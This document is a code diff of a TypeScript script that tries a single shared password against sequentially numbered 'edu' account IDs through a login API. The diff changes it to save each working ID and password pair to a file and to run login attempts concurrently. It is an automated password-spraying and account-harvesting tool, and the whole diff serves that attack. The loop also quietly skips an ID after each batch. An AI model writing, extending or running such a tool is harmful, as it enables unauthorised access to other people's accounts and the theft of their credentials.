@@ -1,13 +1,13 @@
 import { logger } from '../Logger';
 import { config } from '../config';
 import { login } from './api';
-import fs from 'fs'
+import fs from 'fs';
 
 async function testAccount(id: string) {
     var token = await login(id, config.password);
     if (!token) return logger.remove(id);
     logger.add(id);
-    fs.appendFile(config.outFile,id,()=>{})
+    fs.appendFile(config.outFile, `${id} ${config.password}` + '\n', () => {});
 }
 
 export default async function findAccount() {
@@ -16,6 +16,11 @@ export default async function findAccount() {
         currentId < config.base + config.findNumber;
         currentId++
     ) {
-        await testAccount('edu' + currentId);
+        var testQueue: Promise<void>[] = [];
+        for (let i = 0; i < config.asyncNumber; i++) {
+            testQueue.push(testAccount('edu' + currentId));
+            currentId++;
+        }
+        await Promise.all(testQueue);
     }
 }
